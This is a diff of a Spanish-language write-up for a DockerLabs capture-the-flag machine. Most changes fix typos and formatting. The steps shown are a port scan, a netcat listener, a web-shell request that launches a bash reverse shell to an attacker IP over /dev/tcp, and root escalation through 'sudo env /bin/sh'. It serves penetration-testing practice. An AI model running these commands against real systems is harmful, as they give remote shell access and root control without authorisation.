@@ -2,7 +2,7 @@
 
 #web - https://dockerlabs.es/#/
 
-Primero hacemos un escaneo de puertos basico hacia la ip que por defecto es la *172.17.0.2*.
+Primero hacemos un escaneo de puertos básico hacia la ip que por defecto es la *172.17.0.2*.
 
 ```shell
 └─$ nmap -sV -sC -n -p- --min-rate 5000 172.17.0.2
@@ -74,7 +74,8 @@ Entramos a "https://www.revshells.com/" en esta web encontramos reverse shells y
 ![Captura de pantalla 2024-05-13 204807](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/28ff216f-eaf8-4fe3-95ac-4520704adc72)
 
 
-Ejecutamos netcat con el puento 9001 como puerto de escucha
+Ejecutamos netcat con el puerto 9001 como puerto de escucha:
+
 ```shell
 └─$ nc -lvnp 9001
 listening on [any] 9001 ...
@@ -82,6 +83,7 @@ listening on [any] 9001 ...
 ```
 
 Ejecutamos la reverse shell de manera en que llamemos al archivo "cmd.php" y le pasasemos los parametros anteriores "?cmd=id" y ahora sustituimos id por bash -c seguido de dos comillas y la reverse shell:
+
 ```shell
 http://172.17.0.2/uploads/cmd.php?cmd=bash -c "bash -i >%26 /dev/tcp/10.0.2.15/9001 0>%261" )
 
@@ -89,15 +91,17 @@ http://172.17.0.2/uploads/cmd.php?cmd=bash -c "bash -i >%26 /dev/tcp/10.0.2.15/9
 
 ![Captura de pantalla 2024-05-13 210138](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/853d7ccc-3224-4c5d-8495-0247a5960d9d)
 
-Ahora solo faltaria la escalada de privilegios
+Ahora solo faltaría la escalada de privilegios
 Comprobamos los permisos del usuario con:
+
 ```shell
 └─$ sudo -l
 ```
 
 ![Captura de pantalla 2024-05-13 210530](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/449ea752-5a93-4e67-a77e-d306b1111214)
 
-En este caso podemos ver que podemos ejecutar el binario "/usr/bin/env" siendo este usuario root como se puede apreciar y indica que no tiene contraseña entonces prodecedemos a ejecutar este binario:
+En este caso podemos ver que podemos ejecutar el binario "/usr/bin/env" siendo este usuario "root" como se puede apreciar y indica que no tiene contraseña entonces prodecedemos a ejecutar este binario:
+
 ```shell
 └─$ sudo env /bin/sh
 ```
@@ -106,6 +110,7 @@ En este caso podemos ver que podemos ejecutar el binario "/usr/bin/env" siendo e
 
 y ahora realizamos un whoami para saber que usuario somos:
 ```shell
-whoami
+# whoami
+root
 ```
 y podremos comprobar que si que somos el usuario root.
